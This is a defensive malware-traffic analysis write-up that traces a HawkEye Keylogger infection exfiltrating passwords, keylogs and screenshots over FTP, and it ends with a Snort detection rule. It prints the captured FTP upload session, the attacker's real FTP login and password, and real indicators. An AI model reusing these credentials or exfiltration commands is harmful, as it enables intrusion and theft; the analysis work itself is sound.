---
title: BEGUILESOFT — Splunk-first baselining to HawkEye Keylogger stealing passwords, keylogs and screenshots over FTP
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - ftp
  - exfiltration
---

# BEGUILESOFT — HawkEye Keylogger: stolen passwords, keylogs and screenshots over FTP { #beguilesoft }

!!! abstract "Case summary"
    The malware-traffic-analysis.net 2019-05-02 "BEGUILESOFT" PCAP, worked **Splunk-first** on the home-lab **pcapbox** VM, with Arkime only where the packet content is needed. One Windows 7 PC in an AD domain (**Breaux-Win7-PC, user adriana.breaux**) looks up its public IP, then logs in to the free hosting service `files.000webhost[.]com` over **FTP** with the account **`snifferzett`** and uploads five files in three sessions, 10–15 minutes apart: a **"Stealer Records"** file with saved passwords for **Gmail, BB&T online banking and Outlook mail**, two **keylogs** (payment data typed into Excel) and two **screenshots** — about **5 MB**. File names say **HawkEye Keylogger**. The page ends with one very simple Snort rule and a short report.

| | |
|---|---|
| **Evidence** | `2019-05-02-traffic-analysis-exercise.pcap` — 2019-05-02 21:35:18 – 22:05:23 UTC (about 30 min) |
| **Source** | [malware-traffic-analysis.net 2019-05-02 "BEGUILESOFT"](https://malware-traffic-analysis.net/2019/05/02/index.html) |
| **Environment** | Closed network. pcapbox VM: Splunk (`index=zeek`, case field `pcap_case`), Arkime (tag = case name), Snort 2.9.20. **No Wireshark.** |
| **Deliverables** | Analysis, one Snort rule |
| **Related pages** | [Night Dew (pcapbox setup, Snort test guide)](night-dew-hancitor-pony-zeus-panda-tls-c2.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Zeek logs](../../network/zeek/index.md) · [Playbook: data exfiltration](../playbooks/data-exfiltration.md) |

!!! tip "How to read this page"
    The order is the order the case was worked: **baselining → suspicious destinations → FTP detail → Arkime for content → Snort**. Every SPL query is explained line by line, followed by what the result looked like and how to read it. The **Question** boxes are questions asked while working the case, with their answers.

!!! warning "The indicators on this page are real"
    Domains, IPs and account names come from real 2019 malware traffic. Prose and tables are defanged (`[.]`); code blocks keep values as typed. **Do not visit them.** The victim's real password is not shown on this page.

## Answers at a glance { #answers }

| Item | Answer | Status |
|---|---|---|
| Infected PC | **10.0.0.227, Breaux-Win7-PC**, MAC `84:8f:69:09:86:c0` (Dell) | Confirmed |
| User | **adriana.breaux** (domain BEGUILESOFT) | Confirmed |
| DC | 10.0.0.10, beguilesoft-dc.beguilesoft[.]com | Confirmed |
| First malicious event | **21:36:14 UTC** public IP lookup (`whatismyipaddress[.]com`), then **21:36:33** first FTP login | Confirmed |
| Exfil destination | `files.000webhost[.]com` — 145.14.145.4, 145.14.144.10, 145.14.145.99 (one name, three IPs) | Confirmed |
| FTP account | `snifferzett` (attacker's account, same in all three sessions) | Confirmed |
| Data stolen | 5 files, ~5.06 MB: Stealer Records (Gmail, BB&T bank, Outlook POP3 — **one password reused for all three**), 2 keylogs (Excel payment data, Word typing), 2 screenshots | Confirmed |
| Upload result | All 5 STOR commands got `226 File successfully transferred` | Confirmed |
| Initial access | Not in the capture — the PC was already infected | Inferred |
| Malware family | HawkEye Keylogger — taken from the **uploaded file names**, not from a sample | Inferred (strong) |

---

## Step 0 — Before the first query { #prep }

The PCAP was dropped into `\\10.50.10.60\incoming` as **`20190502_BEGUILESOFT.pcap`**, so the case name is `20190502_BEGUILESOFT` (Splunk field `pcap_case`, Arkime tag). Two things to check before any query:

1. **Splunk time range = All time.** On pcapbox `_time` is the packet time (2019), so the default "Last 24 hours" returns nothing.
2. **Splunk account time zone = UTC** (account menu → Preferences), because `strftime` prints in your Splunk time zone.

Setup and ingest are explained in [Night Dew — Step 0](night-dew-hancitor-pony-zeus-panda-tls-c2.md#prep).

---

## Step 1 — Baselining { #baseline }

**Goal:** before looking for anything bad, learn the basics — **when** the capture runs, **which logs** exist, **which internal PCs** talk, and the **host name, MAC, DC and user**. None of this goes into the report except the host details.

### 1-1. Capture window and log types { #log-types }

```spl
index=zeek pcap_case="20190502_BEGUILESOFT"
| stats count AS events min(ts) AS first max(ts) AS last BY sourcetype
| eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S")
| sort - events
```

- **Line 1** takes every Zeek event of this case. `pcap_case` is the field pcapbox fills with the PCAP file name.
- **Line 2** `stats` works like a pivot table: "group, then calculate". `BY sourcetype` groups by log type (conn, dns, http…). For each group it counts events (`count`), finds the earliest time (`min(ts)`) and the latest (`max(ts)`). `AS` names the result column.
- **Line 3** `eval` calculates or overwrites a value. `ts` is an epoch number such as 1556832918; `strftime` turns it into a readable date.
- **Line 4** `sort - events` sorts by event count, largest first. `-` means descending.

Result (281 events, 15 log types):

```text
sourcetype          events  first                last
zeek:conn           99      2019-05-02 21:35:18  2019-05-02 22:05:23
zeek:dns            49      2019-05-02 21:35:18  2019-05-02 22:01:33
zeek:kerberos       39      2019-05-02 21:35:18  2019-05-02 22:05:23
zeek:ldap_search    23      2019-05-02 21:35:18  2019-05-02 21:36:13
zeek:dce_rpc        15      2019-05-02 21:35:18  2019-05-02 21:36:57
zeek:ldap           15      2019-05-02 21:35:18  2019-05-02 21:36:13
zeek:ftp            10      2019-05-02 21:36:35  2019-05-02 22:01:34
zeek:files          9       2019-05-02 21:35:24  2019-05-02 22:01:35
zeek:smb_mapping    9       2019-05-02 21:35:18  2019-05-02 22:05:23
zeek:ntp            4       2019-05-02 21:35:23  2019-05-02 21:52:27
zeek:weird          3       2019-05-02 21:35:18  2019-05-02 21:36:57
zeek:http           2       2019-05-02 21:35:26  2019-05-02 21:36:14
zeek:smb_files      2       2019-05-02 21:35:24  2019-05-02 21:36:13
zeek:dhcp           1       2019-05-02 21:35:21  2019-05-02 21:35:21
zeek:software       1       2019-05-02 21:35:26  2019-05-02 21:35:26
```

**Reading the result:**

- The `zeek:conn` first–last is the capture window: **21:35:18 – 22:05:23 UTC, about 30 minutes**.
- kerberos, ldap, dce_rpc and smb are normal **Windows domain** traffic.
- **`zeek:ftp` has 10 events (21:36:35 – 22:01:34)**, there is **no `zeek:ssl` at all**, and HTTP has only 2 events. An office PC rarely uses FTP, while info-stealer malware often sends stolen data over FTP. Not a conclusion yet — but the first place to look after baselining.

### 1-2. DHCP — host name, MAC, domain { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case="20190502_BEGUILESOFT"
| eval time=strftime(ts, "%Y-%m-%d %H:%M:%S")
| table time assigned_addr mac host_name domain msg_types
```

- `sourcetype=zeek:dhcp` takes DHCP logs only.
- `table` shows only the columns you name, in that order.
- `assigned_addr` = IP the DHCP server gave · `mac` = the PC's MAC · `host_name` = the name the PC announced (the report HOSTNAME) · `domain` = domain name from DHCP · `msg_types` = DHCP message types.

```text
time                 assigned_addr  mac                host_name       domain           msg_types
2019-05-02 21:35:21                 84:8f:69:09:86:c0  Breaux-Win7-PC  beguilesoft.com  INFORM ACK
```

!!! note "Why is `assigned_addr` empty?"
    `msg_types` is **INFORM**, not REQUEST. A PC that already has an IP (fixed address, or a lease from before) sends DHCPINFORM to ask only for **settings** such as the domain name. Nothing is "assigned", so the field is empty. The IP comes from the next query (10.0.0.227). Add `client_addr` to the `table` to see the IP the PC used to ask.

### 1-3. Which internal IPs start connections { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case="20190502_BEGUILESOFT"
| where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h)
| stats count AS conns dc(id_resp_h) AS dests BY id_orig_h
| sort - conns
```

- `id_orig_h` = the IP that **started** the connection.
- `where` keeps only events where the condition is true. `cidrmatch("10.0.0.0/8", id_orig_h)` asks "is this IP inside 10.0.0.0/8?". With the three private ranges joined by `OR`, only **internal** IPs stay.
- `count` = connections; `dc(id_resp_h)` = **distinct count** of destination IPs. `BY id_orig_h` gives one row per internal IP.

```text
id_orig_h    conns  dests
10.0.0.227   99     10
```

**Only one internal PC starts connections**, to only 10 destinations. 10.0.0.227 is the suspect.

### 1-4. Kerberos — DC and user account { #kerberos }

```spl
index=zeek sourcetype=zeek:kerberos pcap_case="20190502_BEGUILESOFT"
| stats count BY id_orig_h id_resp_h client
```

Kerberos (port 88) is the Windows domain logon. One log gives three facts: `id_resp_h` = the server that answers = **the DC**, and `client` = `user/DOMAIN` = **the logged-on account**.

```text
id_orig_h    id_resp_h   client                            count
10.0.0.227   10.0.0.10   /BEGUILESOFT.COM                  15
10.0.0.227   10.0.0.10   BREAUX-WIN7-PC$/BEGUILESOFT.COM   12
10.0.0.227   10.0.0.10   adriana.breaux/BEGUILESOFT        2
10.0.0.227   10.0.0.10   adriana.breaux/BEGUILESOFT.COM    5
10.0.0.227   10.0.0.10   breaux-win7-pc$/BEGUILESOFT.COM   2
10.0.0.227   10.0.0.10   breaux-win7-pc$/beguilesoft.com   2
```

**Reading the result:**

- **DC = 10.0.0.10.**
- Names ending in **`$`** are **computer accounts** (the PC itself logging on) — they confirm the host name, nothing more.
- **`/BEGUILESOFT.COM` with no name (15)** are **TGS requests** (ticket for a service). A TGS request does not carry the user name in readable form, so Zeek leaves it empty.
- What is left is the **user: adriana.breaux**.

If `zeek:kerberos` is missing, use `sourcetype=zeek:ntlm` with `BY id_orig_h username hostname domainname`.

**Baseline summary:** capture 21:35:18 – 22:05:23 UTC · one PC **10.0.0.227 Breaux-Win7-PC**, MAC 84:8f:69:09:86:c0 · domain beguilesoft.com · DC 10.0.0.10 · user **adriana.breaux**. And FTP is unusual.

---

## Step 2 — Every destination, in time order { #destinations }

There are only 10 destinations, so look at all of them.

```spl
index=zeek sourcetype=zeek:conn pcap_case="20190502_BEGUILESOFT"
| stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

- `sum()` adds up the values in each group. `orig_bytes` = bytes the PC **sent**, `resp_bytes` = bytes it **received**. More sent than received points to **data leaving** (exfil).
- `BY id_resp_h id_resp_p service` makes one row per destination IP + port + protocol that Zeek recognised (dns, http, ftp…).
- `sort first` has no `-`, so it is **ascending** — first contact first, like a timeline.

```text
id_resp_h        id_resp_p  service             conns  sent      recv    first
10.0.0.10        135        dce_rpc             1      496       548     21:35:18
10.0.0.10        389        ldap_tcp,krb,gssapi 4      11310     14015   21:35:18
10.0.0.10        445        gssapi,smb,krb      5      20962     7212    21:35:18
10.0.0.10        53         dns                 21     1307      2354    21:35:18
10.0.0.10        88         krb_tcp             24     28669     31383   21:35:18
...              (more DC, broadcast, LLMNR, DHCP, NTP rows)
204.2.193.137    80         http                1      97        179     21:35:26
104.16.154.36    80         http                1      71        564     21:36:14
145.14.145.4     21         ftp                 1      152       540     21:36:33
145.14.145.4     37280      ftp-data            1      2791      0       21:36:35
145.14.144.10    21         ftp                 1      205       747     21:46:27
145.14.144.10    40651      ftp-data            1      891       0       21:46:27
145.14.144.10    47434      ftp-data            1      2832685   0       21:46:28
145.14.145.99    21         ftp                 1      206       746     22:01:33
145.14.145.99    35396      ftp-data            1      2225681   0       22:01:34
145.14.145.99    36091      ftp-data            1      601       0       22:01:34
```

**Reading the result:**

- Everything at 21:35 to 10.0.0.10 is the domain logon: DNS, Kerberos, LDAP, SMB, RPC. Normal.
- Only **three external groups**: 204.2.193.137 (Windows connectivity check), 104.16.154.36 at 21:36:14, and **three 145.14.x IPs on FTP**.
- **`ftp` and `ftp-data` come in pairs.** Port 21 carries only a few hundred bytes; the high-port `ftp-data` connections carry up to 2.8 MB — and **received 0 bytes**. That is the shape of an upload.
- Three FTP sessions: **21:36, 21:46, 22:01** (10 and 15 minutes apart).

### 2-1. DNS — which names are behind those IPs { #dns }

```spl
index=zeek sourcetype=zeek:dns pcap_case="20190502_BEGUILESOFT"
| stats count values(answers) AS answers min(ts) AS first BY query
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

- `query` = the name the PC asked about.
- `values(answers)` collects every answer for that name **without duplicates** into one cell, so you can match "name → IP" with the conn result.

Key lines (domain lookups such as `_ldap._tcp...`, `WPAD`, `isatap` are normal Windows noise):

```text
query                              count  answers                                              first
beguilesoft-dc.beguilesoft.com     2      10.0.0.10                                            21:35:18
breaux-win7-pc.beguilesoft.com     2      add: A breaux-win7-pc.beguilesoft.com 10.0.0.227 ... 21:35:26
www.msftncsi.com                   1      204.2.193.137 204.2.193.138 a1961.g2.akamai.net ...   21:35:26
whatismyipaddress.com              1      104.16.154.36 104.16.155.36                          21:36:14
files.000webhost.com               8      145.14.144.10 145.14.145.4 145.14.145.99 us-east-1.route-1000.000webhost.awex.io  21:36:33
dns.msftncsi.com                   2      131.107.255.255 fd3e:4f5a:5b81::1                    21:41:28
```

**Reading the result:**

- `breaux-win7-pc.beguilesoft.com` with `add: A ... 10.0.0.227` is the PC **registering its own DNS name** — another confirmation of IP + host name.
- `www.msftncsi.com` / `dns.msftncsi.com` = Windows "am I online?" checks. Normal.
- **`whatismyipaddress[.]com` at 21:36:14** — a "what is my public IP?" service. People rarely visit it; malware uses it to learn where it runs. HawkEye is known for this lookup.
- **`files.000webhost[.]com` at 21:36:33**, asked 8 times, answers **three IPs** — exactly the three FTP servers. 000webhost is a **free hosting** service: cheap and anonymous for an attacker to receive stolen data.

---

## Step 3 — What went over FTP { #ftp }

```spl
index=zeek sourcetype=zeek:ftp pcap_case="20190502_BEGUILESOFT"
| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h user command arg reply_code reply_msg
```

`zeek:ftp` has **one line per FTP command**. `user` = login account · `command` = the FTP command (**STOR** = upload to the server, **RETR** = download) · `arg` = its argument (for STOR, the file name) · `reply_code` = server answer (226 = transfer complete).

```text
time      id_resp_h      user         command  arg                                                                          reply_code  reply_msg
21:36:35  145.14.145.4   snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,145,4,145,160).
21:36:35  145.14.145.4   snifferzett  STOR     ftp://145.14.145.4/HawkEye_Keylogger_Stealer_Records_BREAUX-WIN7-PC 5.2.2019 9:36:28 PM.txt  421  Idle timeout (30 seconds): closing control connection
21:46:27  145.14.144.10  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,144,10,158,203).
21:46:28  145.14.144.10  snifferzett  STOR     ftp://145.14.144.10/HawkEye_Keylogger_Keylog_Records_2_BREAUX-WIN7-PC 5.2.2019 9:46:22 PM.txt  226  0.068 seconds (measured here), 12.72 Kbytes per second
21:46:28  145.14.144.10  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,144,10,185,74).
21:46:28  145.14.144.10  snifferzett  STOR     ftp://145.14.144.10/screenshot1_BREAUX-WIN7-PC.jpeg                         421         Idle timeout (30 seconds): closing control connection
22:01:34  145.14.145.99  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,145,99,138,68).
22:01:34  145.14.145.99  snifferzett  STOR     ftp://145.14.145.99/HawkEye_Keylogger_Keylog_Records_3_BREAUX-WIN7-PC 5.2.2019 10:01:28 PM.txt  226  0.064 seconds (measured here), 9.12 Kbytes per second
22:01:34  145.14.145.99  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,145,99,140,251).
22:01:34  145.14.145.99  snifferzett  STOR     ftp://145.14.145.99/screenshot2_BREAUX-WIN7-PC.jpeg                         421         Idle timeout (30 seconds): closing control connection
```

**Reading the result:**

1. **The file names give the malware away:** `HawkEye_Keylogger_Stealer_Records_...`, `HawkEye_Keylogger_Keylog_Records_2/3_...`, `screenshot1/2_...`. HawkEye is a well-known info-stealer (keylogger).
2. **The first upload is "Stealer Records"** — passwords saved in browsers and mail clients. The next two sessions each send one **keylog** (keystrokes) and one **screenshot**.
3. **Same account `snifferzett` every time**, three different 000webhost IPs.
4. The times in the file names (9:36:28 PM, 9:46:22 PM, 10:01:28 PM) match the UTC times in the capture: **the PC clock is set to UTC**.
5. Why does Zeek show **USER/PASS** nowhere? Zeek's `ftp.log` does not log every command. By default (`FTP::logged_commands`) it keeps one line only for transfer-related commands (STOR, RETR, APPE, DELE, PASV, PORT, EPSV, EPRT…) and **adds the login to the `user` and `password` columns** of those lines. The password is `<hidden>` by default; the real value is visible in Arkime ([Step 4](#arkime)).

### 3-1. Matching each file to its size (PASV port arithmetic) { #pasv-math }

`zeek:ftp` has no file sizes; the sizes are on the `ftp-data` lines of `conn`. Match them with the **PASV reply**: in `(h1,h2,h3,h4,p1,p2)` the first four numbers are the IP and the data port is **p1 × 256 + p2**.

```text
(145,14,145,4,145,160)   → 145×256+160 = 37280 → 2,791 B     Stealer_Records
(145,14,144,10,158,203)  → 158×256+203 = 40651 → 891 B       Keylog_Records_2
(145,14,144,10,185,74)   → 185×256+74  = 47434 → 2,832,685 B screenshot1
(145,14,145,99,138,68)   → 138×256+68  = 35396 → 2,225,681 B screenshot2
(145,14,145,99,140,251)  → 140×256+251 = 36091 → 601 B       Keylog_Records_3
```

Total sent on the data channels: **5,062,649 B ≈ 5.06 MB**, received 0. A second check: the 226 reply for Keylog_Records_3 says 0.064 s at 9.12 KB/s ≈ 584 B — close to the 601 bytes on the wire.

!!! question "Question: please explain the FTP commands in more detail"
    **FTP uses two connections.** The **control connection** (port 21) carries only commands and answers ("log me in", "I am sending this file"). The file contents go over a separate **data connection**. That is why `conn` shows `ftp` (port 21, a few hundred bytes) next to `ftp-data` (high port, megabytes). Read the control connection for **what and where**, the data connection for **how much and what content**.

    One upload in this PCAP, as Arkime shows it (`C:` = infected PC, `S:` = server):

    ```text
    S: 220 ProFTPD Server (000webhost.com) [::ffff:145.14.144.10]   ← server greeting
    C: USER snifferzett                         ← account name
    S: 331 User snifferzett OK. Password required
    C: PASS ********                            ← password (clear text!)
    S: 230 OK. Current restricted directory is /
    C: OPTS utf8 on                             ← use UTF-8 for file names
    S: 200 OK, UTF-8 enabled
    C: PWD                                      ← which folder am I in?
    S: 257 "/" is your current location
    C: CWD /                                    ← go to the top folder
    S: 250 OK. Current directory is /
    C: TYPE I                                   ← binary mode
    S: 200 TYPE is now 8-bit binary
    C: PASV                                     ← open a data port for me
    S: 227 Entering Passive Mode (145,14,144,10,158,203).
    C: STOR HawkEye_Keylogger_Keylog_Records_2_BREAUX-WIN7-PC 5.2.2019 9:46:22 PM.txt
    S: 150 Connecting to port 44294             ← send it on the data connection
       [data connection 10.0.0.227 → 145.14.144.10:40651, 891 B]
    S: 226-File successfully transferred        ← received
    C: TYPE I / PASV / STOR screenshot1_BREAUX-WIN7-PC.jpeg
       [data connection → :47434, 2,832,685 B]
    S: 226-File successfully transferred
    S: 421 Idle timeout (30 seconds): closing control connection
    ```

    **Command by command:**

    - **USER / PASS** — login name and password. FTP has no encryption, so the **password crosses the network in clear text**. The attacker builds the FTP account into the malware, so the account is exposed — a good IOC.
    - **OPTS utf8 on / PWD / CWD /** — set UTF-8 file names, ask the current folder, move to the top folder. Normal FTP client libraries send these automatically.
    - **TYPE** — transfer mode: `TYPE A` = text (ASCII), `TYPE I` = binary (Image). JPEG files are sent with `TYPE I`.
    - **PASV** — "Passive mode, open a port for me". The reply `227 (h1,h2,h3,h4,p1,p2)` gives the IP and the port p1×256+p2.
    - **STOR** — **upload**: the client stores a file on the server. An internal PC doing STOR to an external server means **exfiltration**. The key command of this case.
    - **QUIT** — end the session. Here the server closed it first with 421.

    **Other commands you will meet:**

    | Command | Meaning | Why it matters |
    |---|---|---|
    | RETR | Download (server → client) | Pulling a malicious file from outside |
    | APPE | Append to an existing file | Can be used for exfil like STOR |
    | PORT / EPRT | Active mode (the server connects back to the client) | Rare today because of NAT and firewalls |
    | EPSV | Extended PASV (IPv6-ready, port only) | Reply looks like `229 (\|\|\|port\|)` |
    | LIST / NLST | Folder listing | Reconnaissance |
    | CWD / MKD / DELE | Change folder, make folder, delete file | DELE to clean up |
    | SYST / FEAT | Ask server type / features | Normal clients use them too |

    **Why malware almost always uses PASV:** the infected PC is usually behind NAT, so nothing outside can connect in. In passive mode the client connects **out**, which always works.

    **Reply codes — the first digit is enough:** 1xx in progress (150 opening data connection), 2xx success (220 greeting, 227 passive mode, 230 logged in, 226 transfer complete), 3xx more information needed (331 password please), 4xx temporary failure (421 closing), 5xx permanent failure (530 login failed, 550 file not found / no permission).

!!! question "Question: what are PASV and STOR?"
    Think of the FTP server as a **parcel depot**, and the infected PC as someone dropping off parcels (stolen files).

    In FTP the **counter** where you talk (commands) and the **door** where parcels go in (files) are separate. The counter is always in the same place (port 21); the door is opened fresh each time. So the PC first says:

    ```text
    PC:      PASV
    Server:  227 Entering Passive Mode (145,14,144,10,158,203)
    ```

    "Please open a door for my parcel." — "Door 40651 at 145.14.144.10 is open, come there." The first four numbers are the IP; the door number is `158 × 256 + 203 = 40651`. **Passive** means the server just opens the door and waits; the PC walks to it.

    Then the PC says which parcel it is leaving:

    ```text
    PC:      STOR HawkEye_Keylogger_Keylog_Records_2_BREAUX-WIN7-PC ... .txt
    Server:  150 ...                          ← "OK, put it through that door"
             [PC sends 891 bytes through door 40651]
    Server:  226 File successfully transferred ← "Received"
    ```

    **STOR** = Store = **upload** from the PC to the server. The opposite, download, is **RETR** (Retrieve).

    Every upload is a **PASV → STOR** pair: open a door, drop the file, open another door for the next file. That is why PASV and STOR alternate in `zeek:ftp`. The one thing to remember: **an internal PC doing STOR to an external server = our files left the network.** Five STORs here = five stolen files.

---

## Step 4 — Arkime for the content { #arkime }

Splunk shows the shape; the packet content (password, file contents) needs Arkime. FTP is not encrypted, so everything is readable.

```text
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 21
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && (ip.dst == 145.14.145.4 || ip.dst == 145.14.144.10 || ip.dst == 145.14.145.99)
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 37280
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && http.host == whatismyipaddress.com
```

1. FTP control sessions → 3 sessions (login and STOR commands).
2. Everything to 000webhost → 8 sessions (3 control + 5 data).
3. The data connection that carried **Stealer Records**.
4. The public IP lookup.

`tags == <case>` keeps only this case's sessions on pcapbox. Leave it out on a live network.

### 4-1. The FTP login { #ftp-login }

Expand any of the three port 21 sessions and read the packet view. All three show the **same login**:

```text
220 ProFTPD Server (000webhost.com) [::ffff:145.14.145.4]
USER snifferzett
331 User snifferzett OK. Password required
PASS trible22
230-Your bandwidth usage is restricted
230 OK. Current restricted directory is /
```

The attacker's FTP password is in clear text — record it as an IOC (it identifies the attacker's account; it is not the victim's password).

!!! warning "Correction: 421 did not mean the upload failed"
    In Splunk, Stealer Records and both screenshots seemed to get **421 Idle timeout** instead of 226, which looked like "maybe not saved". Arkime shows the real sequence: **every STOR got `226-File successfully transferred`**, and 421 came afterwards, when the control connection had been idle for 30 seconds. Zeek pairs each command with the **last** reply it saw, so the final 421 was attached to the last STOR. **All five files reached the server.** Lesson: do not decide from the Zeek summary alone — open the raw session.

    About `150 Connecting to port 38174` in the 150 reply: that number does not match the PASV port (37280). It is internal to 000webhost; the real data port is the one calculated from 227, as Arkime's session list confirms.

### 4-2. What Stealer Records contained { #stealer-records }

Expand the `port.dst == 37280` session. The file was sent in clear text (shown here with the password removed):

```text
==============================================
Operating System Intel Recovery
==============================================
PC Name: BREAUX-WIN7-PC
Local Time: 5/2/2019 9:36:23 PM
Installed Language: en-US
Net Version: 2.0.50727.5420
Operating System: Microsoft Windows 7 Enterprise
Internal IP Address: 10.0.0.227
External IP Address:
==============================================
WEB Browser Password Stealer
==============================================
URL : https://accounts.google.com/signin/v2/sl/pwd
Web Browser : Chrome
User Name : adriana.breaux@gmail.com
Password : ********
---
URL : https://www.bbt.com/
Web Browser : Internet Explorer 7.0 - 9.0
User Name : adriana.breaux
Password : ********
==============================================
Mail Messenger Password Stealer
==============================================
Application : MS Outlook 2002/2003/2007/2010
Email : adriana.breaux@gmail.com
Server : pop.gmail.com   Server Port : 995   Type : POP3
SMTP Server : smtp.gmail.com   SMTP Server Port : 587
User : adriana.breaux
Password : ********
==============================================
Internet Download Manager Stealer
JDownloader Password Stealer
==============================================
```

**Reading the result:**

- The header block is HawkEye's standard report: PC name, OS, internal IP.
- **Three accounts stolen:** Gmail (saved in Chrome), **BB&T online banking** (saved in IE), Outlook POP3 mail.
- **All three use the same password.** One theft opens all three — password reset for every account.
- **`External IP Address:` is empty.** The whatismyipaddress lookup at 21:36:14 received only 564 bytes, so the public IP check probably failed. Too minor for the report.

!!! note "Do not copy victim passwords into reports"
    A report is read by many people. Write "same password for all 3 — see evidence PCAP" instead of the value. The attacker's FTP password is different: it is an IOC.

### 4-3. What the keylogs contained { #keylogs }

Expand the `40651` (Keylog_Records_2) and `36091` (Keylog_Records_3) sessions:

```text
Keylog_Records_2 (891 B)
[Microsoft Excel - Book1 - 5/2/2019 9:39:22 PM]
Date Ban[BS][BS][BS][BS]Name Amount [V][<][<][<]2019-05-01 Roger Simmons 541.03 ...
Sharon Tate 100 ... Geddy Basher 25.16 ... Fred Rogers 0.10
[Save As - 5/2/2019 9:40:39 PM]
Accounts-payable

Keylog_Records_3 (601 B)
[Document1 - Microsoft Word - 5/2/2019 10:01:15 PM]
I t[BS][BS]t was a dark and story[BS]my night. ...
```

- Each block starts with **the window title and time**, then the keys typed. `[BS]` = Backspace, `[V][<]` = special and arrow keys.
- Keylog 2 shows the user typing **payment data (dates, names, amounts)** into Excel and saving it as **"Accounts-payable"** — company finance data has leaked, not just passwords.

**Summary of Steps 2–4:** HawkEye on Breaux-Win7-PC sent a password report, keystrokes and screenshots to an attacker-controlled 000webhost FTP account, roughly every 10–15 minutes.

### 4-4. Initial access { #initial-access }

Before 21:36 there is only domain logon traffic and the Windows connectivity check — no email, no web download, no file transfer from the internet. The malware was **already on the PC** and ran after logon. Report: "Initial access not in capture". Host check: Run keys, scheduled tasks, email attachments.

!!! question "Question: please give the Arkime queries again with the tag added"
    On pcapbox, add `tags == <case> &&` in front so only this case's sessions are searched:

    ```text
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 21
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && (ip.dst == 145.14.145.4 || ip.dst == 145.14.144.10 || ip.dst == 145.14.145.99)
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 37280
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && ip.dst == 145.14.145.4 && port.dst == 21
    tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && http.host == whatismyipaddress.com
    ```

    The report keeps the **untagged** versions: `tags` only exists on pcapbox, not in the team environment.

!!! question "Question: how do I search for `HawkEye_Keylogger` in Arkime?"
    Not from the Sessions search bar. Arkime does not store FTP file names as a field. To find **any text inside packets**, use **Hunt**:

    1. In **Sessions**, set the scope first: `tags == 20190502_BEGUILESOFT && port.dst == 21`. Hunt only searches the sessions in the current result — the narrower, the faster.
    2. Top menu **Hunt** → **Create a packet search job**.
    3. Fill in: **Name** `hawkeye_ftp` · **Search** `HawkEye_Keylogger` · **Search type** `ascii (case insensitive)` (like Snort's `nocase`) · **Src/Dst** tick **Src** only (the PC sends STOR) · **Max packets per session** default.
    4. **Create**. When it finishes it shows the number of matching sessions — here **3** (each control session has a HawkEye_Keylogger STOR).
    5. Open the results in Sessions with `huntName == hawkeye_ftp`. Matching sessions are labelled with the hunt name, so it works like a field.

    **Faster alternative:** Arkime does store the FTP login as the **Users** field, so this works directly in the search bar:

    ```text
    tags == 20190502_BEGUILESOFT && user == snifferzett
    ```

    Rule of thumb: **any text inside packets → Hunt**; **values Arkime extracted as fields** (IP, port, host, user…) → search bar. Hunt is like a string search run over many sessions at once.

---

## Step 5 — One Snort rule { #snort }

The easiest version, with no `depth`/`distance`:

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 21 (msg:"HawkEye Keylogger FTP upload - Sung"; content:"HawkEye_Keylogger"; nocase; sid:1000021; rev:1;)
```

**Header** (which packets to look at):

- `alert` — raise an alert when it matches.
- `tcp` — TCP only.
- `$HOME_NET any` — from the internal network, any source port.
- `->` — direction: inside to outside.
- `$EXTERNAL_NET 21` — to an external host on port 21 (FTP control).

**Options** (what to find inside the packet):

- `msg` — the text shown in the alert.
- `content:"HawkEye_Keylogger"` — this text appears in the packet.
- `nocase` — ignore case (`hawkeye_keylogger` matches too).
- `sid` — rule number; own rules use 1000000+.
- `rev` — rule version.

!!! question "Question: can the rule be written without `depth` or `distance`?"
    Yes — the rule above. `depth` and `distance` say **where** in the packet the text must be, to cut false positives and speed things up. Here the text `HawkEye_Keylogger` is so unusual that normal FTP traffic will not contain it, so position does not matter. The `STOR ` condition was dropped for the same reason: this file name going to port 21 is practically always an upload. `flow` and `classtype` were dropped too; the `->` and port 21 in the header already fix the direction.

**Expected result:** put it in `\\10.50.10.60\rules\local.rules` and run `snort-test 20190502_BEGUILESOFT` → **3 alerts** (the three STORs with HawkEye_Keylogger in the name: Stealer_Records, Keylog_Records_2, Keylog_Records_3). The two screenshot STORs do not contain the text. The full testing guide is in [Night Dew — 8-3](night-dew-hancitor-pony-zeus-panda-tls-c2.md#snort-test).

---

## Timeline (2019-05-02, UTC) { #timeline }

| Time | Event |
|---|---|
| 21:35:18 | Capture starts; domain logon traffic to DC 10.0.0.10 (DNS, Kerberos, LDAP, SMB) |
| 21:35:21 | DHCP INFORM: Breaux-Win7-PC, beguilesoft.com |
| 21:35:26 | Windows connectivity check (`www.msftncsi[.]com`) — normal |
| 21:36:14 | Public IP lookup `whatismyipaddress[.]com` (104.16.154.36) |
| 21:36:33–21:36:35 | FTP login `snifferzett` to 145.14.145.4, upload **Stealer Records** (2,791 B) |
